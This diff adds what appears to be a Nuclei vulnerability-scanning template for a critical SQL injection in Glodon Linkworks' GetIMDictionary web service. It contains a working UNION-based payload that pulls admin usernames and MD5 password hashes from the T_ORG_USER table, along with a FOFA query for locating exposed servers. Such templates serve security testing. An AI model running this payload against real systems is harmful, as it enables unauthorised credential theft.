@@ -1,0 +1,32 @@
+id: glodon-linkworks-GetIMDictionary-sqli
+
+info:
+  name: Glodon Linkworks GetIMDictionary - SQL injection
+  author: Co5mos
+  severity: critical
+  description: Glodon Linkworks GetIMDictionary SQL injection
+  metadata:
+    max-request: 2
+    verified: true
+    fofa-query: 'header="Services/Identification/login.ashx" || banner="Services/Identification/login.ashx"'
+  tags: glodon,sqli
+
+http:
+  - raw:
+      - |
+        POST /Webservice/IM/Config/ConfigService.asmx/GetIMDictionary HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/x-www-form-urlencoded
+
+        key=1' UNION ALL SELECT top 1 concat(F_CODE,':',F_PWD_MD5) from T_ORG_USER --
+
+    matchers-condition: and
+    matchers:
+      - type: regex
+        part: body
+        regex:
+          - "value=\"admin:(\\w{32})\""
+
+      - type: status
+        status:
+          - 200
